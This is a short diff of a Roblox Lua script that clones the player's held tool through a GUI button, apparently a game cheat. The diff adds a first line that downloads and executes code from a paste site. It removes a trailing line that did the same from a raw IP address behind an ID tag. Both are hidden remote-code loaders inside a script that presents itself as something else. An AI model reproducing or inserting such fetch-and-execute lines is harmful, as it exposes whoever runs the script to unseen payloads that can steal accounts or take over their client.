@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/LiuwqZ86/raw"))()
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
@@ -91,6 +92,3 @@ local function cloneHeldTool()
 end
 
 button.MouseButton1Click:Connect(cloneHeldTool)
-
-ID="4fd7a655-8cd2-4ba8-8c6a-80d11eb52d26";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
